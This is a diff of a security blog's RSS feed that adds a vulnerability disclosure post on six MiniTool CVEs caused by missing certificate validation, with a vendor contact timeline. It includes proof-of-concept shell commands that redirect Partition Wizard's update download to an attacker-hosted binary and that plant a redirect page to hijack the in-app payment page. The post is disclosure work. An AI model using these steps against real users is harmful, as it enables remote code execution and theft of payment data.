@@ -5,18 +5,166 @@
     <description>Vulnerability Research &amp; Exploitation</description>
     <link>/</link>
     <atom:link href="/feed.xml" rel="self" type="application/rss+xml"/>
-    <pubDate>Sun, 13 Aug 2023 19:44:30 +0200</pubDate>
-    <lastBuildDate>Sun, 13 Aug 2023 19:44:30 +0200</lastBuildDate>
+    <pubDate>Sun, 10 Sep 2023 20:27:10 +0200</pubDate>
+    <lastBuildDate>Sun, 10 Sep 2023 20:27:10 +0200</lastBuildDate>
     <generator>Jekyll v4.3.2</generator>
     
       <item>
-        <title>CVE-2023-38351, CVE-2023-38352, CVE-2023-38353, CVE-2023-38354, CVE-2023-38355, CVE-2023-38356 PLACEHOLDER</title>
-        <description>&lt;p&gt;This is a placeholder for CVE-2023-38351, CVE-2023-38352, CVE-2023-38353, CVE-2023-38354, CVE-2023-38355, CVE-2023-38356. We are still trying to work with the vendor in order to mitigate these issues.&lt;/p&gt;
+        <title>How Flawed Certificate Handling Leads to Critical Vulnerabilities</title>
+        <description>&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
+&lt;p&gt;In this short blog post, we’ll quickly delve into the critical yet seemingly overlooked issue of flawed certificate handling within applications. What started as a mere curiosity on my end quickly unveiled six unpatched vulnerabilities, illustrating how seemingly minor oversights can lead to serious security risks, including PII loss and Remote Code Execution.&lt;/p&gt;
+&lt;h2 id=&quot;disclosure-disclaimer&quot;&gt;Disclosure Disclaimer&lt;/h2&gt;
+&lt;p&gt;While looking into this issue, 6 vulnerabilities were discovered in Minitool’s software. Multiple attempts were made to reach out to Minitool in order to resolve these issues, but all were ignored. As of today (&lt;strong&gt;10-09-2023&lt;/strong&gt;), these vulnerabilities remain unpatched and end-users of the mentioned software are at risk. For full transparency I’m including a timeline containing contact attempts. Along with the date at which full reports were shared with the vendor.&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Date&lt;/th&gt;
+      &lt;th&gt;Description&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;14-06-2023&lt;/td&gt;
+      &lt;td&gt;Initial contact attempt with the affected vendor through support@minitool.com&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;23-06-2023&lt;/td&gt;
+      &lt;td&gt;Second contact attempt through support@minitool.com and twitter (@minitool_)&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;01-07-2023&lt;/td&gt;
+      &lt;td&gt;Third contact attempt through support@minitool.com&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;18-07-2023&lt;/td&gt;
+      &lt;td&gt;6 reports containing details of the vulnerabilities along with mitigation recommendations were shared with support@minitool.com&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;10-09-2023&lt;/td&gt;
+      &lt;td&gt;Publication of this vulnerability details&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;why-certificates-matter&quot;&gt;Why Certificates Matter&lt;/h2&gt;
+&lt;p&gt;In today’s digital landscape, the concept of trust is, if not the most crucial, certainly one of the most crucial aspects of online interactions. From securing our financial transactions to protecting our personal data, we rely on technologies built to validate and encrypt these connections.&lt;/p&gt;
+
+&lt;p&gt;&lt;span style=&quot;color: #ffffff; background-color: #500000; padding: 2px; border-radius: 3px&quot;&gt;A key mechanism preventing attackers from stealing your banking information through a Man-in-the-Middle (MitM) attack is a certificate, verified against a ‘trusted authority’.&lt;/span&gt;&lt;/p&gt;
+
+&lt;p&gt;Applications bear the responsibility of managing these certificates and conducting the necessary checks. While most of us are familiar with browsers that signal certificate trustworthiness using clear indicators like red or green locks and warning messages, similar signaling within applications is rarely seen. Surprisingly, even the most popular bug bounty platforms often leave MitM scenarios out of scope, potentially leaving end-users at risk.&lt;/p&gt;
+
+&lt;h2 id=&quot;cases-of-improper-certificate-handling&quot;&gt;Cases of Improper Certificate Handling&lt;/h2&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Trust, but verify&lt;/p&gt;
+
+  &lt;p&gt;&lt;cite&gt;Ronald Reagan&lt;/cite&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;To evaluate instances of improper certificate handling, one must establish a MitM position. This can be easily achieved locally by configuring an Access Point. For our specific tests, we leveraged the Windows hosts file (located at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\\Windows\\System32\\drivers\\etc\\hosts&lt;/code&gt;) to manually modify the domain resolutions.&lt;/p&gt;
+&lt;h3 id=&quot;cve-2023-38352---rce-through-insecure-updates&quot;&gt;CVE-2023-38352 - RCE through insecure updates&lt;/h3&gt;
+&lt;p&gt;The first application that caught my eye was &lt;strong&gt;Minitool Partition Wizard&lt;/strong&gt;. Upon intercepting the traffic directed to &lt;em&gt;www.partitionwizard.com&lt;/em&gt;, we quickly identify an update configuration file being requested.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Pasted%20image%2020230910165919.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;If we now change the update binary download location to our own server and enable the &lt;em&gt;ForceDownloadNewVersion&lt;/em&gt; flag, any time someone opens the Partition Wizard application below version 12.9 will download and execute our binary with &lt;strong&gt;high&lt;/strong&gt; elevation.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mkdir checking-update
+curl -L https://partitionwizard.com/checking-update/verconfig-v11-free.txt -o ./checking-update/verconfig-v11-free.txt
+
+sed -e &apos;s/SoftwareVersion=120800/SoftwareVersion=120900/g&apos; \
+-e &apos;s/SoftwareVersionText=12.8/SoftwareVersionText=12.9/g&apos; \
+-e &apos;s/ForceDownloadNewVersion=0/ForceDownloadNewVersion=1/g&apos; \
+-e &apos;s/Lastversion-download-url-1=.*$/Lastversion-download-url-1=https:\/\/0dr3f.github.io\/bin\/calc.exe/g&apos; \
+-i checking-update/verconfig-v11-free.txt
+
+python3 -m http.server 80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Pasted%20image%2020230910165444.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Pasted%20image%2020230910165457.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h3 id=&quot;cve-2023-38353---pii-leaking-through-insecure-payment-system&quot;&gt;CVE-2023-38353 - PII Leaking through insecure payment system&lt;/h3&gt;
+
+&lt;p&gt;The second application we will look at is &lt;strong&gt;Minitool Power Data Recovery&lt;/strong&gt;. This application has a built-in subscription system that basically renders &lt;em&gt;www.minitool.com&lt;/em&gt; from within the application.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Pasted%20image%2020230910191434.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Pasted%20image%2020230910191731.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;If we intercept traffic send towards &lt;em&gt;www.minitool.com&lt;/em&gt;, we can quickly identify the page requested for the subscription page.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Pasted%20image%2020230910185044.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We can now create our own payment page, recreate the original one, or proxy all data send to our payment page to the original one in order to steal payment information.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mkdir -p promotions/pdr
+echo &quot;&amp;lt;meta http-equiv=\&quot;Refresh\&quot; content=\&quot;0; url=&apos;https://0dr3f.github.io/policy/&apos;\&quot; /&amp;gt;&quot; &amp;gt; promotions/pdr/buy-inner-software.php
+php -S 0.0.0.0:80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/Pasted%20image%2020230910191344.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;cve-2023-38351-6&quot;&gt;CVE-2023-38351-6&lt;/h3&gt;
+&lt;p&gt;In less than a day of examining various applications, I uncovered the following CVEs. Upon discovery of these CVEs I decided to stop looking and instead contact the vendor to initiate resolving these issues.&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;CVE&lt;/th&gt;
+      &lt;th&gt;Type&lt;/th&gt;
+      &lt;th&gt;Software&lt;/th&gt;
+      &lt;th&gt;Description&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;CVE-2023-38351&lt;/td&gt;
+      &lt;td&gt;Missing SSL Certificate Validation&lt;/td&gt;
+      &lt;td&gt;MiniTool Partition Wizard 12.8&lt;/td&gt;
+      &lt;td&gt;MiniTool Partition Wizard 12.8 contains an insecure installation mechanism that allows attackers to achieve remote code execution through a man in the middle attack.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;CVE-2023-38352&lt;/td&gt;
+      &lt;td&gt;Missing SSL Certificate Validation&lt;/td&gt;
+      &lt;td&gt;MiniTool Partition Wizard 12.8&lt;/td&gt;
+      &lt;td&gt;MiniTool Partition Wizard 12.8 contains an insecure update mechanism that allows attackers to achieve remote code execution through a man in the middle attack.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;CVE-2023-38353&lt;/td&gt;
+      &lt;td&gt;Missing SSL Certificate Validation&lt;/td&gt;
+      &lt;td&gt;MiniTool Power Data Recovery 11.6&lt;/td&gt;
+      &lt;td&gt;MiniTool Power Data Recovery 11.6 contains an insecure in-app payment system that allows attackers to steal highly sensitive information through a man in the middle attack.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;CVE-2023-38354&lt;/td&gt;
+      &lt;td&gt;Missing SSL Certificate Validation&lt;/td&gt;
+      &lt;td&gt;MiniTool Shadow Maker 4.1&lt;/td&gt;
+      &lt;td&gt;MiniTool Shadow Maker 4.1 contains an insecure installation process that allows attackers to achieve remote code execution through a man in the middle attack.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;CVE-2023-38355&lt;/td&gt;
+      &lt;td&gt;Missing SSL Certificate Validation&lt;/td&gt;
+      &lt;td&gt;MiniTool Movie Maker 7.0&lt;/td&gt;
+      &lt;td&gt;MiniTool Movie Maker 7.0 contains an insecure installation process that allows attackers to achieve remote code execution through a man in the middle attack.&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;CVE-2023-38356&lt;/td&gt;
+      &lt;td&gt;Missing SSL Certificate Validation&lt;/td&gt;
+      &lt;td&gt;MiniTool Power Data Recovery 11.6&lt;/td&gt;
+      &lt;td&gt;MiniTool Power Data Recovery 11.6 contains an insecure installation process that allows attackers to achieve remote code execution through a man in the middle attack.&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
+&lt;p&gt;In this short post we examined several applications that improperly handle certificates and the severe implications this can have for end users. It further highlights how the Man-in-the-Middle attack vector seems to be an overlooked area in bug bounty programs, despite its potential to lead to critical vulnerabilities, including PII loss and Remote Code Execution.&lt;/p&gt;
 
 </description>
-        <pubDate>Sun, 13 Aug 2023 16:01:35 +0200</pubDate>
-        <link>/2023/08/13/CVEPLACEHOLDER/</link>
-        <guid isPermaLink="true">/2023/08/13/CVEPLACEHOLDER/</guid>
+        <pubDate>Sun, 10 Sep 2023 00:00:00 +0200</pubDate>
+        <link>/2023/09/10/CVE/</link>
+        <guid isPermaLink="true">/2023/09/10/CVE/</guid>
         
         <category>CVE</category>
         
